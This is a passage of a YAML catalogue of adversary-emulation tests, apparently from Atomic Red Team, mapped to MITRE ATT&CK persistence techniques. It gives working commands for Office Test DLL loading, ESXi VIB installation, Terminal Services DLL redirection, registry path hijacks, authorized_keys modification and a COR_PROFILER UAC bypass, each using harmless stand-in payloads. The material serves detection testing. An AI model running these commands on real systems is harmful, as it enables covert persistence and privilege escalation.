    to meet this requirement"

    '
  input_arguments: {}
  mitre_info:
    mitre_data_sources:
    - 'Windows Registry: Windows Registry Key Creation'
    - 'Command: Command Execution'
    - 'File: File Modification'
    - 'Windows Registry: Windows Registry Key Modification'
    - 'File: File Creation'
    - 'Process: Process Creation'
    - 'Module: Module Load'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may abuse the Microsoft Office "Office Test" Registry
      key to obtain persistence on a compromised system. An Office Test Registry location
      exists that allows a user to specify an arbitrary DLL that will be executed
      every time an Office application is started. This Registry key is thought to
      be used by Microsoft to load DLLs for testing and debugging purposes while developing
      Office applications. This Registry key is not created by default during an Office
      installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test
      Sofacy)


      There exist user and global Registry keys for the Office Test feature, such
      as:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf</code>


      Adversaries may add this Registry key and specify a malicious DLL that will
      be executed whenever an Office application, such as Word or Excel, is started.'
    mitre_examples: []
    mitre_id: T1137.002
    mitre_mitigations: []
    mitre_name: Office Test
    mitre_platforms:
    - Windows
    - Office Suite
    mitre_references:
    - https://attack.mitre.org/techniques/T1137/002
    - https://researchcenter.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/
    - http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/
    mitre_related_techniques: []
  name: Office Application Startup Test Persistence (HKCU)
  platforms:
  - windows
  prereq_command: "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n\
    \  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n"
  references: []
- atomic_id: 7f843046-abf2-443f-b880-07a83cf968ec
  cleanup_command: 'echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw
    "#{vm_pass}" -m "#{vib_remove}"

    '
  command: '#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp

    echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}"
    -m "#{vib_install}"

    '
  description: 'An adversary can maintain persistence within an ESXi host by installing
    malicious vSphere Installation Bundles (VIBs).

    [Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-malware-persistence)

    '
  get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
    -ErrorAction Ignore -Force | Out-Null

    Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"
    -OutFile "PathToAtomicsFolder\..\ExternalPayloads\plink.exe"

    Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe" -OutFile
    "PathToAtomicsFolder\..\ExternalPayloads\pscp.exe"

    '
  input_arguments:
    plink_file:
      default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe
      description: Path to plink
      type: path
    pscp_file:
      default: PathToAtomicsFolder\..\ExternalPayloads\pscp.exe
      description: Path to Pscp
      type: path
    vib_file:
      default: PathToAtomicsFolder\..\atomics\T1129\src\atomicvibes.vib
      description: Path to the dummy vib
      type: path
    vib_install:
      default: PathToAtomicsFolder\..\atomics\T1129\src\esxi_vibinstall.txt
      description: Path to script with commands to install the vib
      type: path
    vib_remove:
      default: PathToAtomicsFolder\..\atomics\T1129\src\esxi_vibremove.txt
      description: Path to script with commands to remove the vib
      type: path
    vm_host:
      default: atomic.local
      description: Specify the host name of the ESXi Server
      type: string
    vm_pass:
      default: pass
      description: Specify the privilege user password on ESXi Server
      type: string
    vm_user:
      default: root
      description: Specify the privilege user account on ESXi Server
      type: string
  mitre_info:
    mitre_data_sources:
    - 'Process: OS API Execution'
    - 'Module: Module Load'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may execute malicious payloads via loading shared
      modules. Shared modules are executable files that are loaded into processes
      to provide access to reusable code, such as specific custom functions or invoking
      OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).


      Adversaries may use this functionality as a way to execute arbitrary payloads
      on a victim system. For example, adversaries can modularize functionality of
      their malware into shared objects that perform various functions such as managing
      C2 network communications or execution of specific actions on objective.


      The Linux & macOS module loader can load and execute shared objects from arbitrary
      local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen`
      and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib`
      files.(Citation: Apple Dev Dynamic Libraries)(Citation: Linux Shared Libraries)(Citation:
      RotaJakiro 2021 netlab360 analysis)(Citation: Unit42 OceanLotus 2017)


      The Windows module loader can be instructed to load DLLs from arbitrary local
      paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality
      resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106)
      which is called from functions like `LoadLibrary` at run time.(Citation: Microsoft
      DLL)'
    mitre_examples: []
    mitre_id: T1129
    mitre_mitigations: []
    mitre_name: Shared Modules
    mitre_platforms:
    - Windows
    - macOS
    - Linux
    mitre_references:
    - https://attack.mitre.org/techniques/T1129
    - https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
    - https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html
    - https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/
    - https://learn.microsoft.com/troubleshoot/windows-client/deployment/dynamic-link-library
    - https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html
    mitre_related_techniques: []
  name: ESXi - Install a custom VIB on an ESXi host
  platforms:
  - windows
  prereq_command: 'if (Test-Path "#{plink_file}") {exit 0} else {exit 1}

    if (Test-Path "#{pscp_file}") {exit 0} else {exit 1}

    '
  references: []
- atomic_id: 18136e38-0530-49b2-b309-eed173787471
  cleanup_command: Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\TermService\Parameters"
    -Name "ServiceDll" -Value "C:\Windows\System32\termsrv.dll"
  command: "$termsrvDll = \"C:\\Windows\\System32\\termsrv.dll\"\n\n$ACL = Get-Acl\
    \ $termsrvDll\n$permission = \"Administrators\",\"FullControl\",\"Allow\"\n$accessRule\
    \ = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\n\
    $ACL.SetAccessRule($accessRule)\nSet-Acl -Path $termsrvDll -AclObject $ACL\n\n\
    Copy-Item -Path $termsrvDll -Destination \"$HOME\\AtomicTest.dll\"\n\n$newServiceDll\
    \ = \"$HOME\\AtomicTest.dll\"\n\n$registryPath = \"HKLM:\\System\\CurrentControlSet\\\
    services\\TermService\\Parameters\"\n\n# Check if the registry key exists\nif\
    \ (Test-Path -Path $registryPath) {\n    # Modify the ServiceDll value in the\
    \ registry\n    Set-ItemProperty -Path $registryPath -Name \"ServiceDll\" -Value\
    \ $newServiceDll\n    Write-Host \"ServiceDll value in the registry has been updated\
    \ to: $newServiceDll\"\n} else {\n    Write-Host \"Registry key not found. Make\
    \ sure the 'TermService\\Parameters' key exists.\"\n}"
  description: This atomic test simulates the modification of the ServiceDll value
    in HKLM\System\CurrentControlSet\services\TermService\Parameters. This technique
    may be leveraged by adversaries to establish persistence by loading a patched
    version of the DLL containing malicious code.
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources:
    - 'Module: Module Load'
    - 'Command: Command Execution'
    - 'File: File Modification'
    - 'Windows Registry: Windows Registry Key Modification'
    - 'Process: Process Creation'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may abuse components of Terminal Services to enable
      persistent access to systems. Microsoft Terminal Services, renamed to Remote
      Desktop Services in some Windows Server OSs as of 2022, enable remote terminal
      connections to hosts. Terminal Services allows servers to transmit a full, interactive,
      graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop
      Services)


      [Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run
      as a "generic" process (ex: <code>svchost.exe</code>) load the service''s DLL
      file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation:
      Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically
      stored in `%SystemRoot%\System32\`, is the default <code>ServiceDll</code> value
      for Terminal Services in `HKLM\System\CurrentControlSet\services\TermService\Parameters\`.


      Adversaries may modify and/or replace the Terminal Services DLL to enable persistent
      access to victimized hosts.(Citation: James TermServ DLL) Modifications to this
      DLL could be done to execute arbitrary payloads (while also potentially preserving
      normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable
      features of Terminal Services. For example, an adversary may enable features
      such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)
      sessions by either patching the <code>termsrv.dll</code> file or modifying the
      <code>ServiceDll</code> value to point to a DLL that provides increased RDP
      functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a
      non-server Windows OS this increased functionality may also enable an adversary
      to avoid Terminal Services prompts that warn/log out users of a system when
      a new RDP session is created.'
    mitre_examples: []
    mitre_id: T1505.005
    mitre_mitigations: []
    mitre_name: Terminal Services DLL
    mitre_platforms:
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1505/005
    - https://x.com/james_inthe_box/status/1150495335812177920
    - https://social.technet.microsoft.com/wiki/contents/articles/12229.windows-system-services-fundamentals.aspx
    - https://docs.microsoft.com/windows/win32/termserv/about-terminal-services
    - https://github.com/stascorp/rdpwrap
    - http://woshub.com/how-to-allow-multiple-rdp-sessions-in-windows-10/
    mitre_related_techniques: []
  name: Modify Terminal Services DLL Path
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 15f44ea9-4571-4837-be9e-802431a7bfae
  cleanup_command: 'Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet
    Settings" -Name T1112 -ErrorAction Ignore

    '
  command: 'New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet
    Settings" -Name T1112 -Value "<script>"

    '
  description: 'Upon execution, a javascript block will be placed in the registry
    for persistence.

    Additionally, open Registry Editor to view the modified entry in HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet
    Settings.

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: &id031
    - 'Windows Registry: Windows Registry Key Modification'
    - 'Process: OS API Execution'
    - 'Network Traffic: Network Traffic Flow'
    - 'Command: Command Execution'
    - 'Windows Registry: Windows Registry Key Deletion'
    - 'Windows Registry: Windows Registry Key Creation'
    - 'Process: Process Creation'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may interact with the Windows Registry to hide
      configuration information within Registry keys, remove information as part of
      cleaning up, or as part of other techniques to aid in persistence and execution.


      Access to specific areas of the Registry depends on account permissions, some
      requiring administrator-level access. The built-in Windows command-line utility
      [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote
      Registry modification. (Citation: Microsoft Reg) Other tools may also be used,
      such as a remote access tool, which may contain functionality to interact with
      the Registry through the Windows API.


      Registry modifications may also include actions to hide keys, such as prepending
      key names with a null character, which will cause an error and/or be ignored
      when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities
      using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may
      abuse these pseudo-hidden keys to conceal payloads/commands used to maintain
      persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps
      Hiding Reg Jul 2017)


      The Registry of a remote system may be modified to aid in execution of files
      as part of lateral movement. It requires the remote Registry service to be running
      on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      are required, along with access to the remote system''s [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)
      for RPC communication.'
    mitre_examples: []
    mitre_id: T1112
    mitre_mitigations: []
    mitre_name: Modify Registry
    mitre_platforms: &id032
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1112
    - https://technet.microsoft.com/en-us/library/cc732643.aspx
    - https://technet.microsoft.com/en-us/library/cc754820.aspx
    - https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657
    - https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353
    - https://docs.microsoft.com/sysinternals/downloads/reghide
    - https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull
    - https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/
    mitre_related_techniques: []
  name: Javascript in registry
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 4469192c-2d2d-4a3a-9758-1f31d937a92b
  cleanup_command: 'reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\#{new_key}"
    /f

    '
  command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\#{new_key}"
    /t REG_SZ /v Command /d #{new_executable} /f

    '
  description: "The Windows Compatibility Telemetry system makes use of the CompatTelRunner.exe\
    \ binary to run a variety of telemetry tasks. It relies on the registry for instructions\
    \ on which commands to run. \nIt will run any arbitrary command without restriction\
    \ of location or type. Blog :https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence\n"
  get_prereq_command: ''
  input_arguments:
    new_executable:
      default: C:\Windows\System32\notepad.exe
      description: Custom Executable to run
      type: string
    new_key:
      default: NewKey
      description: New Registry Key Added
      type: string
  mitre_info:
    mitre_data_sources: *id031
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may interact with the Windows Registry to hide
      configuration information within Registry keys, remove information as part of
      cleaning up, or as part of other techniques to aid in persistence and execution.


      Access to specific areas of the Registry depends on account permissions, some
      requiring administrator-level access. The built-in Windows command-line utility
      [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote
      Registry modification. (Citation: Microsoft Reg) Other tools may also be used,
      such as a remote access tool, which may contain functionality to interact with
      the Registry through the Windows API.


      Registry modifications may also include actions to hide keys, such as prepending
      key names with a null character, which will cause an error and/or be ignored
      when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities
      using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may
      abuse these pseudo-hidden keys to conceal payloads/commands used to maintain
      persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps
      Hiding Reg Jul 2017)


      The Registry of a remote system may be modified to aid in execution of files
      as part of lateral movement. It requires the remote Registry service to be running
      on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      are required, along with access to the remote system''s [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)
      for RPC communication.'
    mitre_examples: []
    mitre_id: T1112
    mitre_mitigations: []
    mitre_name: Modify Registry
    mitre_platforms: *id032
    mitre_references:
    - https://attack.mitre.org/techniques/T1112
    - https://technet.microsoft.com/en-us/library/cc732643.aspx
    - https://technet.microsoft.com/en-us/library/cc754820.aspx
    - https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657
    - https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353
    - https://docs.microsoft.com/sysinternals/downloads/reghide
    - https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull
    - https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/
    mitre_related_techniques: []
  name: Abusing Windows TelemetryController Registry Key for Persistence
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: f2915249-4485-42e2-96b7-9bf34328d497
  cleanup_command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\cleanuppath"
    /t REG_EXPAND_SZ /d "%SystemRoot%\System32\cleanmgr.exe /D %c" /f

    '
  command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\cleanuppath"
    /t REG_EXPAND_SZ /d "%systemroot%\system32\notepad.exe" /f

    '
  description: 'Replacing the registry settings with custom executable will end up
    with the replacement programs being executed at the time OS will decide to kick
    off the respective activity

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: *id031
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may interact with the Windows Registry to hide
      configuration information within Registry keys, remove information as part of
      cleaning up, or as part of other techniques to aid in persistence and execution.


      Access to specific areas of the Registry depends on account permissions, some
      requiring administrator-level access. The built-in Windows command-line utility
      [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote
      Registry modification. (Citation: Microsoft Reg) Other tools may also be used,
      such as a remote access tool, which may contain functionality to interact with
      the Registry through the Windows API.


      Registry modifications may also include actions to hide keys, such as prepending
      key names with a null character, which will cause an error and/or be ignored
      when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities
      using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may
      abuse these pseudo-hidden keys to conceal payloads/commands used to maintain
      persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps
      Hiding Reg Jul 2017)


      The Registry of a remote system may be modified to aid in execution of files
      as part of lateral movement. It requires the remote Registry service to be running
      on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      are required, along with access to the remote system''s [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)
      for RPC communication.'
    mitre_examples: []
    mitre_id: T1112
    mitre_mitigations: []
    mitre_name: Modify Registry
    mitre_platforms: *id032
    mitre_references:
    - https://attack.mitre.org/techniques/T1112
    - https://technet.microsoft.com/en-us/library/cc732643.aspx
    - https://technet.microsoft.com/en-us/library/cc754820.aspx
    - https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657
    - https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353
    - https://docs.microsoft.com/sysinternals/downloads/reghide
    - https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull
    - https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/
    mitre_related_techniques: []
  name: Abusing MyComputer Disk Cleanup Path for Persistence
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 3235aafe-b49d-451b-a1f1-d979fa65ddaf
  cleanup_command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath"
    /t REG_EXPAND_SZ /d "%systemroot%\system32\dfrgui.exe" /f

    '
  command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath"
    /t REG_EXPAND_SZ /d "%systemroot%\system32\notepad.exe" /f

    '
  description: 'Replacing the registry settings with custom executable will end up
    with the replacement programs being executed at the time OS will decide to kick
    off the respective activity

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: *id031
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may interact with the Windows Registry to hide
      configuration information within Registry keys, remove information as part of
      cleaning up, or as part of other techniques to aid in persistence and execution.


      Access to specific areas of the Registry depends on account permissions, some
      requiring administrator-level access. The built-in Windows command-line utility
      [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote
      Registry modification. (Citation: Microsoft Reg) Other tools may also be used,
      such as a remote access tool, which may contain functionality to interact with
      the Registry through the Windows API.


      Registry modifications may also include actions to hide keys, such as prepending
      key names with a null character, which will cause an error and/or be ignored
      when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities
      using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may
      abuse these pseudo-hidden keys to conceal payloads/commands used to maintain
      persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps
      Hiding Reg Jul 2017)


      The Registry of a remote system may be modified to aid in execution of files
      as part of lateral movement. It requires the remote Registry service to be running
      on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      are required, along with access to the remote system''s [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)
      for RPC communication.'
    mitre_examples: []
    mitre_id: T1112
    mitre_mitigations: []
    mitre_name: Modify Registry
    mitre_platforms: *id032
    mitre_references:
    - https://attack.mitre.org/techniques/T1112
    - https://technet.microsoft.com/en-us/library/cc732643.aspx
    - https://technet.microsoft.com/en-us/library/cc754820.aspx
    - https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657
    - https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353
    - https://docs.microsoft.com/sysinternals/downloads/reghide
    - https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull
    - https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/
    mitre_related_techniques: []
  name: Abusing MyComputer Disk Fragmentation Path for Persistence
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 599f3b5c-0323-44ed-bb63-4551623bf675
  cleanup_command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath"
    /t REG_EXPAND_SZ /d "%SystemRoot%\system32\sdclt.exe" /f

    '
  command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath"
    /t REG_EXPAND_SZ /d "%systemroot%\system32\notepad.exe" /f

    '
  description: 'Replacing the registry settings with custom executable will end up
    with the replacement programs being executed at the time OS will decide to kick
    off the respective activity

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: *id031
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may interact with the Windows Registry to hide
      configuration information within Registry keys, remove information as part of
      cleaning up, or as part of other techniques to aid in persistence and execution.


      Access to specific areas of the Registry depends on account permissions, some
      requiring administrator-level access. The built-in Windows command-line utility
      [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote
      Registry modification. (Citation: Microsoft Reg) Other tools may also be used,
      such as a remote access tool, which may contain functionality to interact with
      the Registry through the Windows API.


      Registry modifications may also include actions to hide keys, such as prepending
      key names with a null character, which will cause an error and/or be ignored
      when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities
      using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may
      abuse these pseudo-hidden keys to conceal payloads/commands used to maintain
      persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps
      Hiding Reg Jul 2017)


      The Registry of a remote system may be modified to aid in execution of files
      as part of lateral movement. It requires the remote Registry service to be running
      on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      are required, along with access to the remote system''s [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)
      for RPC communication.'
    mitre_examples: []
    mitre_id: T1112
    mitre_mitigations: []
    mitre_name: Modify Registry
    mitre_platforms: *id032
    mitre_references:
    - https://attack.mitre.org/techniques/T1112
    - https://technet.microsoft.com/en-us/library/cc732643.aspx
    - https://technet.microsoft.com/en-us/library/cc754820.aspx
    - https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657
    - https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353
    - https://docs.microsoft.com/sysinternals/downloads/reghide
    - https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull
    - https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/
    mitre_related_techniques: []
  name: Abusing MyComputer Disk Backup Path for Persistence
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 342cc723-127c-4d3a-8292-9c0c6b4ecadc
  cleanup_command: 'unset ssh_authorized_keys

    '
  command: 'if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys);
    echo "$ssh_authorized_keys" > ~/.ssh/authorized_keys; fi;

    '
  description: "Modify contents of <user-home>/.ssh/authorized_keys to maintain persistence\
    \ on victim host. \nIf the user is able to save the same contents in the authorized_keys\
    \ file, it shows user can modify the file.\n"
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources:
    - 'Command: Command Execution'
    - 'Process: Process Creation'
    - 'File: File Modification'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may modify the SSH <code>authorized_keys</code>\
      \ file to maintain persistence on a victim host. Linux distributions and macOS\
      \ commonly use key-based authentication to secure the authentication process\
      \ of SSH sessions for remote management. The <code>authorized_keys</code> file\
      \ in SSH specifies the SSH keys that can be used for logging into the user account\
      \ for which the file is configured. This file is usually found in the user's\
      \ home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>.(Citation:\
      \ SSH Authorized Keys) Users may edit the system\u2019s SSH config file to modify\
      \ the directives PubkeyAuthentication and RSAAuthentication to the value \u201C\
      yes\u201D to ensure public key and RSA authentication are enabled. The SSH config\
      \ file is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries\
      \ may modify SSH <code>authorized_keys</code> files directly with scripts or\
      \ shell commands to add their own adversary-supplied public keys. In cloud environments,\
      \ adversaries may be able to modify the SSH authorized_keys file of a particular\
      \ virtual machine via the command line interface or rest API. For example, by\
      \ using the Google Cloud CLI\u2019s \u201Cadd-metadata\u201D command an adversary\
      \ may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation:\
      \ Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update\
      \ the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation:\
      \ Azure Update Virtual Machines) This ensures that an adversary possessing the\
      \ corresponding private key may log in as an existing user via SSH.(Citation:\
      \ Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead\
      \ to privilege escalation where the virtual machine or instance has distinct\
      \ permissions from the requesting user.\n\nWhere authorized_keys files are modified\
      \ via cloud APIs or command line interfaces, an adversary may achieve privilege\
      \ escalation on the target virtual machine if they add a key to a higher-privileged\
      \ user. \n\nSSH keys can also be added to accounts on network devices, such\
      \ as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)"
    mitre_examples: []
    mitre_id: T1098.004
    mitre_mitigations: []
    mitre_name: SSH Authorized Keys
    mitre_platforms:
    - Linux
    - macOS
    - IaaS
    - Network
    mitre_references:
    - https://attack.mitre.org/techniques/T1098/004
    - https://www.venafi.com/blog/growing-abuse-ssh-keys-commodity-malware-campaigns-now-equipped-ssh-capabilities
    - https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/
    - https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/security/d1/sec-d1-cr-book/sec-cr-i3.html#wp1254331478
    - https://www.cybereason.com/blog/new-pervasive-worm-exploiting-linux-exim-server-vulnerability
    - https://cloud.google.com/sdk/gcloud/reference/compute/instances/add-metadata
    - https://docs.microsoft.com/en-us/rest/api/compute/virtual-machines/update
    - https://www.ssh.com/ssh/authorized_keys/
    mitre_related_techniques: []
  name: Modify SSH Authorized Keys
  platforms:
  - linux
  - macos
  prereq_command: ''
  references: []
- atomic_id: 9d5f89dc-c3a5-4f8a-a4fc-a6ed02e7cb5a
  cleanup_command: "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\"\
    \ -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment\
    \ -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty\
    \ -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore |\
    \ Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\"\
    \ -Force -ErrorAction Ignore | Out-Null\n"
  command: 'Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}"
    -ForegroundColor Cyan

    New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value
    "#{file_name}" -Force | Out-Null

    New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType
    String -Value "1" -Force | Out-Null

    New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String
    -Value "#{clsid_guid}" -Force | Out-Null

    New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType
    String -Value "#{file_name}" -Force | Out-Null

    Write-Host "executing eventvwr.msc" -ForegroundColor Cyan

    START MMC.EXE EVENTVWR.MSC

    '
  description: 'Creates user scope environment variables and CLSID COM object to enable
    a .NET profiler (COR_PROFILER).

    The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded
    by the Event Viewer process.

    Additionally, the profiling DLL will inherit the integrity level of Event Viewer
    bypassing UAC and executing `notepad.exe` with high integrity.

    If the account used is not a local administrator the profiler DLL will still execute
    each time the CLR is loaded by a process, however,

    the notepad process will not execute with high integrity.


    Reference: https://redcanary.com/blog/cor_profiler-for-persistence/

    '
  get_prereq_command: 'New-Item -Type Directory (split-path "#{file_name}") -ErrorAction
    ignore | Out-Null

    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"
    -OutFile "#{file_name}"

    '
  input_arguments:
    clsid_guid:
      default: '{09108e71-974c-4010-89cb-acf471ae9e2c}'
      description: custom clsid guid
      type: string
    file_name:
      default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll
      description: unmanaged profiler DLL
      type: path
  mitre_info:
    mitre_data_sources: &id033
    - 'Process: Process Creation'
    - 'Windows Registry: Windows Registry Key Modification'
    - 'Module: Module Load'
    - 'Command: Command Execution'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may leverage the COR_PROFILER environment variable
      to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER
      is a .NET Framework feature which allows developers to specify an unmanaged
      (or external of .NET) profiling DLL to be loaded into each .NET process that
